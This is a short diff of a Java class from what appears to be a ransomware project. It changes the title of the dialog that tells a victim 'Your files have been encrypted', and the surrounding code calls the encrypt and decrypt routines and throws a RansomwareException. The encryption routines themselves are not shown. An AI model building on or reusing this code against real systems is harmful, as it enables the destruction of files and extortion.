@@ -17,11 +17,11 @@ public class app {
 
         if (attack.equalsIgnoreCase(ENCRYPT)) {
             p.StartEncryptProcess(PubicKey);
-            JOptionPane.showMessageDialog(null, "Your files have been encrypted.", "Alert", JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Your files have been encrypted.", "Information", JOptionPane.ERROR_MESSAGE);
         }
         else if (attack.equalsIgnoreCase(DECRYPT)) {
             p.StartDecryptProcess(PrivateKey);
-            JOptionPane.showMessageDialog(null, "Your files have been decrypted.", "Alert", JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(null, "Your files have been decrypted.", "Information", JOptionPane.ERROR_MESSAGE);
         }
         else
             throw new RansomwareException("Mismatched Values Try again with correct one");
